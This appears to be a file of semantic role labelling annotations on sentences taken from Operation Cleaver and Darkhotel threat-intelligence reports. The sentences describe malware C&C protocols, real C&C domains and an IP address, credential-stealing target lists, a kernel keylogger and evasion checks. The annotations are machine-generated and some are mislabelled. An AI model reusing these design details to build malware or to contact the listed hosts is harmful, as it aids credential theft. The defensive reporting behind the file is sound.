periodic update checks"}, "ARGM-MNR": {"text": "automatically"}, "V": {"text": "performed", "index": 19}}}, " There are a few well-known tools which are capable of doing this given\nsufficient privileges on the infected host": {"are": {"V": {"text": "are", "index": 1}, "ARG1": {"text": "a few well - known tools which are capable of doing this given sufficient privileges on the infected host"}}, "known": {"ARGM-EXT": {"text": "well"}, "V": {"text": "known", "index": 6}, "ARG1": {"text": "tools"}}, "are_2": {"ARG1": {"text": "a few well - known tools"}, "R-ARG1": {"text": "which"}, "V": {"text": "are", "index": 9}, "ARG2": {"text": "capable of doing this given sufficient privileges on the infected host"}}, "doing": {"R-ARG0": {"text": "which"}, "V": {"text": "doing", "index": 12}, "ARG1": {"text": "this given sufficient privileges"}}, "given": {"V": {"text": "given", "index": 14}, "ARG1": {"text": "sufficient privileges"}}, "infected": {"V": {"text": "infected", "index": 19}, "ARG1": {"text": "host"}}}, " A PHP shell was also observed,\n  which also included attribution to Nesha in its hashed password": {"was": {"V": {"text": "was", "index": 3}}, "observed": {"ARG1": {"text": "A PHP shell"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "observed", "index": 5}}, "included": {"ARG2": {"text": "which"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "included", "index": 9}, "ARG1": {"text": "attribution to Nesha in its hashed password"}}}, "\norg/\u201d /></soap:Body></soap:Envelope>\n\nHTTP/1.1 200 OK\nCache-Control: private, max-age=0\nContent-Type: text/xml; charset=utf-8\nServer: Microsoft-IIS/7.5\nX-AspNet-Version: 2.0.50727\nX-Powered-By: ASP.NET\nDate: Mon, 06 Oct 2014 13:36:47 GMT\nContent-Length: 392\n\n</code>\n</section>\n\n<footer>48</footer>\n\f\n<header>#OPCLEAVER</header>\n<section>\n\n  <heading>TinyZBot Command and Control Protocol (cont.)</heading>\n  <code>\n  <?xml version=\u201d1.0\u201d encoding=\u201dutf-8\u201d?><soap:Envelope\n  xmlns:soap=\u201dhttp://schemas.xmlsoap.org/soap/envelope/\u201d xmlns:xsi=\u201dhttp://www.w3.org/2001/\n  XMLSchema-instance\u201d\n  xmlns:xsd=\u201dhttp://www.w3.org/2001 XMLSchema\u201d><soap:Body><GetServerTimeResponse xmlns=\u201dhttp://\n  tempuri.org/\u201d><GetServerTimeResult>2014-10-06T13:36:47.2193601Z</GetServerTimeResult></\n  GetServerTimeResponse></soap:Body></soap:Envelope>\n</code>\n\n  This is the first query done by a running TinyZBot instance, and needs to be done shortly before\n  most other queries, in order to update the dynamic password": {"is": {"ARGM-DIS": {"text": "org/ \u201d"}, "ARG1": {"text": "This"}, "V": {"text": "is", "index": 5}, "ARG2": {"text": "the first query done by a running TinyZBot instance , and needs to be done shortly before most other queries"}}, "done": {"ARG1": {"text": "the first query"}, "V": {"text": "done", "index": 9}, "ARG0": {"text": "by a running TinyZBot instance"}}, "running": {"V": {"text": "running", "index": 12}, "ARG1": {"text": "TinyZBot instance"}}, "needs": {"V": {"text": "needs", "index": 17}, "ARG1": {"text": "to be done shortly before most other queries ,"}, "ARGM-PRP": {"text": "in order to update the dynamic password"}}, "be": {"V": {"text": "be", "index": 19}}, "done_2": {"V": {"text": "done", "index": 20}, "ARGM-TMP": {"text": "shortly before most other queries"}, "ARGM-PRP": {"text": "in order to update the dynamic password"}}, "update": {"V": {"text": "update", "index": 30}, "ARG1": {"text": "the dynamic password"}}}, " The ability to extract Internet Explorer passwords was added": {"extract": {"V": {"text": "extract", "index": 3}, "ARG1": {"text": "Internet Explorer passwords"}}, "was": {"V": {"text": "was", "index": 7}}, "added": {"ARG1": {"text": "The ability to extract Internet Explorer passwords"}, "V": {"text": "added", "index": 8}}}, " As the\n  infected user is going through and filling out all this information, the malware is running in the\n  background, logging their keystrokes, retrieving their stored passwords, etc": {"is": {"V": {"text": "is", "index": 4}}, "going": {"ARG1": {"text": "user"}, "V": {"text": "going", "index": 5}, "ARG2": {"text": "through"}}, "filling": {"ARG2": {"text": "the infected"}, "ARG0": {"text": "user"}, "V": {"text": "filling", "index": 8}, "ARG1": {"text": "all this information"}}, "is_2": {"V": {"text": "is", "index": 16}}, "running": {"ARGM-TMP": {"text": "As the infected user is going through and filling out all this information"}, "ARG1": {"text": "the malware"}, "V": {"text": "running", "index": 17}, "ARGM-LOC": {"text": "in the background"}, "ARGM-ADV": {"text": "logging their keystrokes , retrieving their stored passwords , etc"}}, "logging": {"ARGM-TMP": {"text": "As the infected user is going through and filling out all this information"}, "ARG0": {"text": "the malware"}, "V": {"text": "logging", "index": 22}, "ARG1": {"text": "their keystrokes"}}, "retrieving": {"ARG0": {"text": "the malware"}, "V": {"text": "retrieving", "index": 26}, "ARG1": {"text": "their stored passwords , etc"}}, "stored": {"V": {"text": "stored", "index": 28}, "ARG1": {"text": "passwords"}}}, " The command and control server for this version was located at 173.192.144.68/\n DefaultWS(dot)asmx": {"was": {"V": {"text": "was", "index": 8}}, "located": {"ARG1": {"text": "The command and control server for this version"}, "V": {"text": "located", "index": 9}, "ARGM-LOC": {"text": "at 173.192.144.68/ DefaultWS(dot)asmx"}}}, "\n</section>\n\n\n\n<footer>40</footer>\n\f\n<header>#OPCLEAVER</header>\n\n<section>\n  <heading>MS08-067 Exploit</heading>\n\n  MS08-067 is a vulnerability in Microsoft Windows made popular by the Conficker worm which can\n  be exploited by a specially crafted packet to the operating system\u2019s RPC network interface": {"is": {"ARG1": {"text": "MS08 - 067"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "a vulnerability in Microsoft Windows made popular by the Conficker worm which can be exploited by a specially crafted packet to the operating system \u2019s RPC network interface"}}, "made": {"V": {"text": "made", "index": 9}, "ARG1": {"text": "popular"}, "ARG0": {"text": "by the Conficker worm which can be exploited by a specially crafted packet to the operating system \u2019s RPC network interface"}}, "can": {"V": {"text": "can", "index": 16}}, "be": {"V": {"text": "be", "index": 17}}, "exploited": {"ARG1": {"text": "the Conficker worm"}, "R-ARG1": {"text": "which"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "exploited", "index": 18}, "ARGM-MNR": {"text": "by a specially crafted packet"}, "ARG2": {"text": "to the operating system \u2019s RPC network interface"}}, "crafted": {"ARGM-MNR": {"text": "specially"}, "V": {"text": "crafted", "index": 22}, "ARG1": {"text": "packet"}}}, " The\n  RUNCMD line requests that cmd.exe be executed, with the command ipconfig /all being\n  redirected to a file in a directory designated for files to be uploaded": {"requests": {"ARG0": {"text": "The RUNCMD line"}, "V": {"text": "requests", "index": 3}, "ARG1": {"text": "that cmd.exe be executed"}, "ARGM-MNR": {"text": "with the command ipconfig /all being redirected to a file in a directory designated for files to be uploaded"}}, "be": {"V": {"text": "be", "index": 6}}, "executed": {"ARG1": {"text": "cmd.exe"}, "V": {"text": "executed", "index": 7}}, "being": {"V": {"text": "being", "index": 14}}, "redirected": {"ARG1": {"text": "the command ipconfig /all"}, "V": {"text": "redirected", "index": 15}, "ARG2": {"text": "to a file in a directory designated for files"}, "ARGM-PRP": {"text": "to be uploaded"}}, "designated": {"ARG1": {"text": "a directory"}, "V": {"text": "designated", "index": 22}, "ARG2": {"text": "for files to be uploaded"}}, "be_2": {"ARG1": {"text": "files"}, "V": {"text": "be", "index": 26}, "ARG2": {"text": "uploaded"}}, "uploaded": {"ARG1": {"text": "files"}, "V": {"text": "uploaded", "index": 27}}}, " Nesha often utilized web-based backdoors developed\n  in ASPX, PHP as well as ColdFusion": {"utilized": {"ARG0": {"text": "Nesha"}, "ARGM-TMP": {"text": "often"}, "V": {"text": "utilized", "index": 2}, "ARG1": {"text": "web - based backdoors developed in ASPX , PHP as well as ColdFusion"}}, "based": {"V": {"text": "based", "index": 5}}, "developed": {"V": {"text": "developed", "index": 7}, "ARGM-PRD": {"text": "in"}, "ARGM-TMP": {"text": "ASPX"}}}, "\nNext the module makes sure only one instance of current code is running by\nchecking if system mutex object named \u00ab920111215\u00bb exists": {"makes": {"ARG0": {"text": "Next the module"}, "V": {"text": "makes", "index": 3}, "ARG1": {"text": "sure only one instance of current code is running by checking if system mutex object named \u00ab 920111215 \u00bb exists"}}, "is": {"V": {"text": "is", "index": 11}}, "running": {"ARG1": {"text": "only one instance of current code"}, "V": {"text": "running", "index": 12}, "ARGM-MNR": {"text": "by checking"}, "ARGM-ADV": {"text": "if system mutex object named \u00ab 920111215 \u00bb exists"}}, "checking": {"V": {"text": "checking", "index": 14}, "ARG1": {"text": "if system mutex object named \u00ab 920111215 \u00bb exists"}}, "named": {"ARG1": {"text": "system mutex object"}, "V": {"text": "named", "index": 19}, "ARG2": {"text": "\u00ab 920111215 \u00bb exists"}}, "exists": {"ARG1": {"text": "system mutex object named \u00ab 920111215 \u00bb"}, "V": {"text": "exists", "index": 23}}}, "\n</section>\n\n<section>\n<heading>Information Stealer</heading>\n<table>\nFilename      MD5                                  Link Time (UTC)           Linker\n\nDmaUp3.exe 864cd4a59215a7db2740dfbe4a648053 2012.04.30                       6.0\n                                                   00:25:59\n</table>\nThis module is relatively large (455Kb) and comes as a part of WinRar SFX file\nthat drops and starts the module from %APPDATA%\\Microsoft\\Display\\DmaUp3": {"is": {"ARG1": {"text": "This module"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "relatively large ( 455Kb )"}}, "comes": {"ARG1": {"text": "This module"}, "V": {"text": "comes", "index": 9}, "ARG2": {"text": "as a part of WinRar SFX file that drops and starts the module from % APPDATA%\\Microsoft\\Display\\DmaUp3"}}, "drops": {"ARG0": {"text": "WinRar SFX file"}, "R-ARG0": {"text": "that"}, "V": {"text": "drops", "index": 18}, "ARG1": {"text": "the module"}}, "starts": {"ARG0": {"text": "WinRar SFX file"}, "R-ARG0": {"text": "that"}, "V": {"text": "starts", "index": 20}, "ARG1": {"text": "the module from % APPDATA%\\Microsoft\\Display\\DmaUp3"}}}, " Here is an example of shortest possible valid server response:\n<list>\n    HTTP/1.1 200 OK\n    Content\u00adLength: 17\n    DEXT87192.168.1.1\n</list>\n2.\t If the real C&C IP address is not valid the module may try to send identical\n    request again but using a different HTTP path: <list>/major/images/read.php</list>\n    If the C&C IP address is valid, the module issues another HTTP request:\n<list>\n    GET /major/txt/read.php HTTP/1.1\n    User\u00adAgent: Mozilla/4.0 (compatible\u037e MSIE 8.0\u037e Windows NT 6.1\u037e Trident/4.0\u037e\n    SLCC2\u037e\n    .NET CLR 2.0.50727\u037e .NET CLR 3.5.30729\u037e .NET CLR 3.0.30729\u037e Media Cen-\n    ter PC 6.0)\n    Host: autolace.twilightparadox.com\n    Connection: Keep\u00adAlive\n    Cache\u00adControl: no\u00adcache\n</list>\n    The server response can be one of the following:\n<list>\n   a": {"is": {"ARG2": {"text": "Here"}, "V": {"text": "is", "index": 1}, "ARG1": {"text": "an example of shortest possible valid server response : a"}}}, " So far, the attackers can steal logins and pass-\nwords but to understand where they are from they must guess the string which\nproduced given hash": {"can": {"ARGM-TMP": {"text": "So far"}, "ARG0": {"text": "the attackers"}, "V": {"text": "can", "index": 5}, "ARG1": {"text": "steal logins and pass- words but to understand where they are"}}, "steal": {"ARGM-TMP": {"text": "So far"}, "ARG0": {"text": "the attackers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "steal", "index": 6}, "ARG1": {"text": "logins and pass- words"}}, "understand": {"ARG0": {"text": "the"}, "V": {"text": "understand", "index": 13}, "ARG1": {"text": "where they are from they must guess the string which produced given hash"}}, "are": {"ARG2": {"text": "where"}, "ARG1": {"text": "they"}, "V": {"text": "are", "index": 16}, "C-ARG2": {"text": "from"}}, "must": {"V": {"text": "must", "index": 19}}, "guess": {"ARG0": {"text": "they"}, "ARGM-MOD": {"text": "must"}, "V": {"text": "guess", "index": 20}, "ARG1": {"text": "the string which produced given hash"}}, "produced": {"ARG1": {"text": "the string"}, "R-ARG1": {"text": "which"}, "V": {"text": "produced", "index": 24}, "ARGM-MNR": {"text": "given hash"}}, "given": {"V": {"text": "given", "index": 25}, "ARG1": {"text": "hash"}}}, "\nThis smaller code section maintains similar functionality to the \u201cworm\u201d compo-\nnent:\n<list>\n\u2022\t B\t ASICAPI window creation and update\n\u2022\t \tVMWare detection/red pill\n\u2022\t \tAV check\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>68</header>\n\n\n\u2022\t dmaup3.exe checks\n\u2022\t proto.dat check\n\u2022\t system information collection, encryption with\n      \u00abab911001f78ad31552e47205ecc46466\u00bb key and transfer to c2\n</list>\nHost package files detected as \u201cVirus.Win32.Pioneer.dx\u201d are infected legitimate\nfiles, that do not have any self\u00adpropagation routines": {"maintains": {"ARG0": {"text": "This smaller code section"}, "V": {"text": "maintains", "index": 4}, "ARG1": {"text": "similar functionality/ \u201d compo- nent"}, "ARG2": {"text": "to the \u201c worm"}}, "detected": {"ARG1": {"text": "Host package files"}, "V": {"text": "detected", "index": 18}, "ARGM-MNR": {"text": "as \u201c Virus"}}, "are": {"V": {"text": "are", "index": 25}}, "infected": {"ARG2": {"text": "Win32.Pioneer.dx \u201d"}, "V": {"text": "infected", "index": 26}, "ARG1": {"text": "legitimate files"}}, "do": {"V": {"text": "do", "index": 31}}, "have": {"ARG0": {"text": "legitimate files"}, "R-ARG0": {"text": "that"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "have", "index": 33}, "ARG1": {"text": "any self\u00adpropagation routines"}}}, " The debug path inside:\n<list>\n d:\\KerKey\\KerKey(\uc77c\ubc18)\\KerKey\\release\\KerKey.pdb\nNote \u00ad\uc77c\ubc18 \u00admeans \u201cGeneral\u201d in Korean\n</list>\nThe dropper above maintains, drops and installs this kernel mode keylogger:\n<list>\nmd5: 86b18e99072ba72d5d36bce9a00fc052 filename: ndiskpro.sys\nsize: 295kb\nCompiledOn:2009\u00ad11\u00ad24 11:56:22\n</list>\nLikely, it was developed as a part of a mid\u00adto\u00adlate 2009 project:\n<list>\n e:\\project\\2009\\x\\total_source\\32bit\\ndiskpro\\src\\ioman.c\n</list>\n</section>\n\n<section>\n<heading>Keylogger Code</heading>\nThis driver package is built to look like a legitimate low level Microsoft system\ndevice": {"is": {"V": {"text": "is", "index": 8}}, "built": {"ARG1": {"text": "This driver package"}, "V": {"text": "built", "index": 9}, "ARGM-PRP": {"text": "to look like a legitimate low level Microsoft system device"}}, "look": {"ARG0": {"text": "This driver package"}, "V": {"text": "look", "index": 11}, "ARG1": {"text": "like a legitimate low level Microsoft system device"}}}, " It is somewhat surprising that there is no rootkit\nfunctionality hiding this service:\n\n\n\n<footer>\nTLP: Green\t                 For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f                                                                                 \n<header>69</header>\n\n<figure></figure>\n\n\nWhen loaded, the NDISKPRO.SYS driver hooks both INT 0x01 and INT 0xff, and\nretrieves keystroke data directly from port 0x60, the motherboard keyboard con-\ntroller itself": {"is": {"V": {"text": "is", "index": 1}, "ARG2": {"text": "somewhat surprising"}, "ARG1": {"text": "that there is no rootkit functionality hiding this service : When loaded , the NDISKPRO.SYS driver hooks both INT 0x01 and INT 0xff , and retrieves keystroke data directly from port 0x60 , the motherboard keyboard con- troller itself"}}, "is_2": {"V": {"text": "is", "index": 6}, "ARG1": {"text": "no rootkit functionality hiding this service"}}, "hiding": {"ARG0": {"text": "no rootkit functionality"}, "V": {"text": "hiding", "index": 10}, "ARG1": {"text": "this service"}}, "loaded": {"ARGM-TMP": {"text": "When"}, "V": {"text": "loaded", "index": 15}, "ARG1": {"text": "the NDISKPRO.SYS"}}, "keystroke": {"ARG0": {"text": "retrieves"}, "V": {"text": "keystroke", "index": 30}, "ARG1": {"text": "data"}, "ARGM-MNR": {"text": "directly"}, "ARGM-CAU": {"text": "from port 0x60"}}}, " Another method to detect VM en-\nvironment is to check local network adapter\u2019s IP address": {"detect": {"ARGM-MNR": {"text": "Another method"}, "V": {"text": "detect", "index": 3}, "ARG1": {"text": "VM en- vironment"}}, "is": {"ARG1": {"text": "Another method to detect VM en- vironment"}, "V": {"text": "is", "index": 7}, "ARG2": {"text": "to check local network adapter \u2019s IP address"}}, "check": {"V": {"text": "check", "index": 9}, "ARG1": {"text": "local network adapter \u2019s IP address"}}}, " Then the module attempts to delete some other, prob-\nably older, components which might be present on the system": {"delete": {"ARG0": {"text": "the module"}, "V": {"text": "delete", "index": 5}, "ARG1": {"text": "some other , prob- ably older , components which might be present on the system"}}, "might": {"V": {"text": "might", "index": 15}}, "be": {"ARG1": {"text": "some other , prob- ably older , components"}, "R-ARG1": {"text": "which"}, "ARGM-MOD": {"text": "might"}, "V": {"text": "be", "index": 16}, "ARG2": {"text": "present on the system"}}}, " The\nrunning process overwrites the igfxext.exe image in the suspended process with\nthis smaller chunk of code": {"overwrites": {"ARG0": {"text": "The running process"}, "V": {"text": "overwrites", "index": 3}, "ARG1": {"text": "the igfxext.exe image"}, "ARGM-LOC": {"text": "in the suspended process"}, "ARGM-ADV": {"text": "with this smaller chunk of code"}}, "suspended": {"V": {"text": "suspended", "index": 9}, "ARG1": {"text": "process"}}}, " First, it checks if cur-\nrent process is running in WOW64 environment": {"checks": {"ARGM-TMP": {"text": "First"}, "V": {"text": "checks", "index": 3}, "ARGM-ADV": {"text": "if cur- rent process is running in WOW64 environment"}}, "is": {"V": {"text": "is", "index": 8}}, "running": {"ARG1": {"text": "cur- rent process"}, "V": {"text": "running", "index": 9}, "ARGM-ADV": {"text": "in WOW64 environment"}}}, " A quote from Wikipedia:\n\u00abBorn in Yokohama Chinatown, Japan (though she is of partial Chinese descent)\nas Linn Minmei, Minmay moved in with her uncle Shaochin (\u5c11\u6c5f) and aunt Feic-\nhun (\u6167\u4e2d) on South Ataria Island in hopes of finding the path to fulfill her dream\nof becoming a star.\u00bb\n</section>\n\n<section>\n<heading>Trojan.Win32.Karba.e</heading>\n<table>\nFilename       MD5                                 Link Time (UTC)          Linker\n\nacroedit.exe   0fe3daf9e8b69255e592c8af97d24649    2013.10.29 00:21:48      6.0\n</table>\n</section>\n\n<section>\n<heading>Technical Notes</heading>\nThe trojan iterates through running processes and looks for security software\nbasing on executable filenames from the list below": {"Born": {"V": {"text": "Born", "index": 6}, "ARGM-LOC": {"text": "in Yokohama Chinatown"}}, "is": {"ARG1": {"text": "she"}, "V": {"text": "is", "index": 15}, "ARG2": {"text": "of partial Chinese descent ) as Linn Minmei"}}, "moved": {"ARG1": {"text": "Minmay"}, "V": {"text": "moved", "index": 26}, "ARGM-DIR": {"text": "in"}, "ARGM-MNR": {"text": "with her uncle Shaochin ( \u5c11\u6c5f ) and aunt Feic- hun ("}}, "finding": {"V": {"text": "finding", "index": 49}, "ARG1": {"text": "the path to fulfill her dream of becoming a star"}}, "fulfill": {"ARG0": {"text": "the path"}, "V": {"text": "fulfill", "index": 53}, "ARG1": {"text": "her dream of becoming a star"}}, "becoming": {"V": {"text": "becoming", "index": 57}, "ARG2": {"text": "a star"}}, "iterates": {"ARG1": {"text": "The trojan"}, "V": {"text": "iterates", "index": 64}, "ARG2": {"text": "through running processes"}}, "looks": {"ARG0": {"text": "iterates"}, "V": {"text": "looks", "index": 69}, "ARG1": {"text": "for security software basing on executable filenames"}}, "basing": {"ARG1": {"text": "security software"}, "V": {"text": "basing", "index": 73}, "ARG2": {"text": "on executable filenames from the list below"}}}, " After\nexecution, the downloaded file drops SMAGENT.EXE (md5 0306f9ae-\n7786570139f78e78bc940597) to %APPDATA%\\MICROSOFT\\DISPLAY and ex-\necutes it": {"ecutes": {"ARGM-TMP": {"text": "After execution"}, "ARG0": {"text": "the downloaded"}, "V": {"text": "ecutes", "index": 18}, "ARG1": {"text": "it"}}}, " Malcode Technical Notes</heading>\n</section>\n<section>\n<heading>Small Downloader</heading>\n<table>\nFilename      MD5                                 Link Time (UTC)           Linker\n\nmsieckc.exe   41b816289a6a639f7f2a72b6c9e6a695    2012.04.11 18:31:48       6.0\n</table>\n</section>\n<section>\n<heading>Technical Details</heading>\nTo ensure only single instance of the module is running, the module verifies if\nsystem mutex named \u00ab132DF6E\u00bb exists": {"ensure": {"ARG0": {"text": "Malcode"}, "V": {"text": "ensure", "index": 4}, "ARG1": {"text": "only single instance of the module is running , the module verifies"}, "ARGM-ADV": {"text": "if system mutex named \u00ab 132DF6E \u00bb exists"}}, "is": {"V": {"text": "is", "index": 11}}, "running": {"ARG1": {"text": "only single instance of the module"}, "V": {"text": "running", "index": 12}, "ARGM-ADV": {"text": "system mutex named \u00ab 132DF6E"}}, "named": {"ARG1": {"text": "system mutex"}, "V": {"text": "named", "index": 20}, "ARG2": {"text": "\u00ab 132DF6E \u00bb exists"}}, "exists": {"ARG1": {"text": "system mutex named \u00ab 132DF6E \u00bb"}, "V": {"text": "exists", "index": 24}}}, "\nNext the malware submits collected information to the C&C server using HTTP\nGET request and the following URL format: http://<C2DOMAIN>/bin/read_i.php\n\n\n\n<footer>\nTLP: Green\t              For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>66</header>\n\n\n?a1=%STEPID%&a2=%HOSTID%&a3=%SYSINFO%&a4=% AVSOFTID%, where\n%C2DOMAIN% is one of the following C&C domains:\n<list>\n\u2022\t \tmicronaoko.jumpingcrab.com\n\u2022\t \tmicrochsse.strangled.net\n\u2022\t \tmicrobrownys.strangled.net\n\u2022\t \tmicroplants.strangled.net\n\u2022\t \tmicrolilics.crabdance.com\n</list>\n%STEPID% is special text string indicating stage of malware operation": {"collected": {"ARGM-TMP": {"text": "Next"}, "ARG0": {"text": "the malware submits"}, "V": {"text": "collected", "index": 4}, "ARG1": {"text": "information"}, "ARG2": {"text": "to the C&C server"}, "ARGM-MNR": {"text": "using HTTP GET request and the following URL format"}}, "using": {"V": {"text": "using", "index": 10}, "ARG1": {"text": "HTTP GET request and"}}, "GET": {"V": {"text": "GET", "index": 12}, "ARG1": {"text": "request"}}, "following": {"V": {"text": "following", "index": 16}, "ARG1": {"text": "URL format"}}, "is": {"ARG1": {"text": "http:// % STEPID%"}, "V": {"text": "is", "index": 23}, "ARG2": {"text": "special text string indicating stage of malware operation"}}, "indicating": {"ARG0": {"text": "special text string"}, "V": {"text": "indicating", "index": 27}, "ARG1": {"text": "stage of malware operation"}}}, " These files are all legitimate files that have been infected by another\nDarkhotel component": {"are": {"ARG1": {"text": "These files"}, "V": {"text": "are", "index": 2}, "ARG2": {"text": "legitimate files that have been infected by another Darkhotel component"}}, "have": {"V": {"text": "have", "index": 7}}, "been": {"V": {"text": "been", "index": 8}}, "infected": {"ARG1": {"text": "legitimate files"}, "R-ARG1": {"text": "that"}, "V": {"text": "infected", "index": 9}, "ARG2": {"text": "by another Darkhotel component"}}}, "\n</section>\n\n<section>\n<heading>Technical Details</heading>\nFrom the very beginning this module checks if \u00abbdagent.exe\u00bb process is running\non current system": {"is": {"V": {"text": "is", "index": 12}}, "running": {"ARG0": {"text": "\u00ab bdagent.exe \u00bb process"}, "V": {"text": "running", "index": 13}, "ARG1": {"text": "current system"}}}, " It drops\na keylogger": {"drops": {"ARG0": {"text": "It"}, "V": {"text": "drops", "index": 1}, "ARG1": {"text": "a keylogger"}}}, " This file is located in the same\ndirectory as the original dropper, which maintains persistence across reboots with\na simple addition to the HKCU run key": {"is": {"V": {"text": "is", "index": 2}}, "located": {"ARG1": {"text": "This file"}, "V": {"text": "located", "index": 3}, "ARGM-LOC": {"text": "in the same directory"}, "ARGM-PRD": {"text": "as the original dropper , which maintains persistence across reboots with a simple addition to the HKCU run key"}}, "maintains": {"ARG0": {"text": "the original dropper"}, "R-ARG0": {"text": "which"}, "V": {"text": "maintains", "index": 14}, "ARG1": {"text": "persistence across reboots with a simple addition to the HKCU run key"}}, "run": {"ARG1": {"text": "a simple addition to the HKCU"}, "V": {"text": "run", "index": 25}, "ARG2": {"text": "key"}}}, " It is logging all actions to inform the operator what exactly was\nexecuted by this variant of the malware": {"is": {"V": {"text": "is", "index": 1}}, "logging": {"V": {"text": "logging", "index": 2}, "ARG1": {"text": "all actions"}, "ARG0": {"text": "to inform the operator what exactly was executed by this variant of the malware"}}, "inform": {"V": {"text": "inform", "index": 6}, "ARG1": {"text": "the operator"}, "ARG2": {"text": "what exactly was executed by this variant of the malware"}}, "was": {"V": {"text": "was", "index": 11}}, "executed": {"ARG1": {"text": "what exactly"}, "V": {"text": "executed", "index": 12}, "ARG0": {"text": "by this variant of the malware"}}}, " After that, the mod-\nule collects information about current system which includes the following:\n<list>\n\u2022\t   \tNetwork adapter MAC address\n\u2022\t   \tCPU Name and Identifier\n\u2022\t   \tSystem default codepage\n\u2022\t   \tWindows OS and Service Pack versions\n\u2022\t    \tHostname and IP address\n\u2022\t     \tLocal user name\n\u2022\t      \tCached passwords from Internet Explorer 6/7/8/9 (Protected Storage and\n        IntelliForms)\n\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f                                                                                  \n<header>61</header>\n\n\n\u2022\t Mozilla Firefox stored secrets (<12.0)\n\u2022\t Chrome stored secrets\n\u2022\t MS Outlook Express accounts\n\u2022\t MS Windows Mail accounts\n\u2022\t MS Windows Live Mail accounts\n\u2022\t MS Outlook accounts (SMTP/IMAP/POP3/HTTP)\n\u2022\t MSN Messenger\n\u2022\t Gmail Notifier credentials\n\u2022\t Google Desktop accounts\n\u2022\t Google Talk accounts\n</list>\nIf the module reveals that current System default codepage is 0412 (Korean) it\nterminates": {"collects": {"ARGM-TMP": {"text": "After that"}, "ARG0": {"text": "the mod- ule"}, "V": {"text": "collects", "index": 6}, "ARG1": {"text": "information about current system which includes the following : If the module reveals that current System default codepage is 0412 ( Korean ) it terminates"}}, "includes": {"ARG2": {"text": "current system"}, "R-ARG2": {"text": "which"}, "V": {"text": "includes", "index": 12}, "ARG1": {"text": "the following : If the module reveals that current System default codepage is 0412 ( Korean ) it terminates"}}, "following": {"V": {"text": "following", "index": 14}}, "reveals": {"ARG0": {"text": "the module"}, "V": {"text": "reveals", "index": 19}, "ARG1": {"text": "that current System default codepage is 0412 ( Korean"}}, "is": {"ARG1": {"text": "current System default codepage"}, "V": {"text": "is", "index": 25}, "ARG2": {"text": "0412"}}, "terminates": {"ARGM-ADV": {"text": "If the module reveals that current System default codepage is"}, "ARG1": {"text": "Korean )"}, "ARG0": {"text": "it"}, "V": {"text": "terminates", "index": 31}}}, "\n</section>\n\n<section>\n<heading>Selective Infector</heading>\n</section>\n<section>\n<heading>Technical Notes</heading>\nIgfxext.exe can download a file and drop it to %APPDATA%\\microsoft\\dis-\nplay\\ctfmon.exe (md5= e8bfb82b0dd5cef46116d61f62c25060)": {"can": {"V": {"text": "can", "index": 1}}, "download": {"ARG0": {"text": "Igfxext.exe"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "download", "index": 2}, "ARG1": {"text": "a file"}}, "drop": {"ARG0": {"text": "Igfxext.exe"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "drop", "index": 6}, "ARG1": {"text": "it"}, "ARG4": {"text": "to % APPDATA%\\microsoft\\dis- play\\ctfmon.exe ( md5= e8bfb82b0dd5cef46116d61f62c25060 )"}}}, " The igfxext.exe component is dropped to disk and run": {"is": {"V": {"text": "is", "index": 3}}, "dropped": {"ARG1": {"text": "The igfxext.exe component"}, "V": {"text": "dropped", "index": 4}, "ARG4": {"text": "to disk"}}, "disk": {"ARG1": {"text": "The igfxext.exe component"}, "V": {"text": "disk", "index": 6}}, "run": {"ARG1": {"text": "The igfxext.exe component"}, "V": {"text": "run", "index": 8}}}, " This component is a virus, and is used to selectively infiltrate into other\ncomputers via USB or network shares": {"is": {"ARG1": {"text": "This component"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a virus"}}, "is_2": {"V": {"text": "is", "index": 7}}, "used": {"ARG1": {"text": "This component"}, "V": {"text": "used", "index": 8}, "ARG2": {"text": "to selectively infiltrate into other computers"}, "ARGM-MNR": {"text": "via USB or network shares"}}, "infiltrate": {"ARG0": {"text": "This component"}, "ARGM-MNR": {"text": "selectively/ via USB or network shares"}, "V": {"text": "infiltrate", "index": 11}, "ARG1": {"text": "into other computers"}}}, " Please note, that after receiving <DATA>, it is XORed with byte\n     value 0x55 and saved to a disk in a file named \u00abctfmon.exe\u00bb (current directory\n     is used)": {"note": {"ARGM-DIS": {"text": "Please"}, "V": {"text": "note", "index": 1}, "ARG1": {"text": "that after receiving , it is XORed with byte value 0x55 and saved to a disk in a file named \u00ab ctfmon.exe \u00bb ( current directory is used )"}}, "receiving": {"V": {"text": "receiving", "index": 5}}, "is": {"ARGM-TMP": {"text": "after receiving"}, "ARG1": {"text": "it"}, "V": {"text": "is", "index": 8}, "ARG2": {"text": "XORed with byte value 0x55"}}, "XORed": {"ARGM-TMP": {"text": "after receiving"}, "ARG0": {"text": "it"}, "V": {"text": "XORed", "index": 9}, "ARGM-MNR": {"text": "with byte value 0x55"}}, "saved": {"ARGM-TMP": {"text": "after receiving"}, "ARG1": {"text": "it"}, "V": {"text": "saved", "index": 15}, "ARG2": {"text": "to a disk"}, "ARGM-LOC": {"text": "in a file named \u00ab ctfmon.exe \u00bb ( current directory is used )"}}, "named": {"ARG1": {"text": "a file"}, "V": {"text": "named", "index": 22}, "ARG2": {"text": "\u00ab ctfmon.exe"}}, "is_2": {"V": {"text": "is", "index": 29}}, "used": {"ARG1": {"text": "(/ current directory"}, "V": {"text": "used", "index": 30}, "ARGM-EXT": {"text": ")"}}}, "\n\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>64</header>\n\n\nThe malware uses fixed User\u00adAgent string:\n<list>\nMozilla/4.0 (compatible\u037e MSIE 8.0\u037e Windows NT 6.1\u037e Trident/4.0\u037e SLCC2\u037e\n.NET\u00a0CLR 2.0.50727\u037e .NET CLR 3.5.30729\u037e .NET CLR 3.0.30729\u037e Media Cen-\nter PC 6.0)\n</list>\nThe data is uploaded as a POST request binary in the following 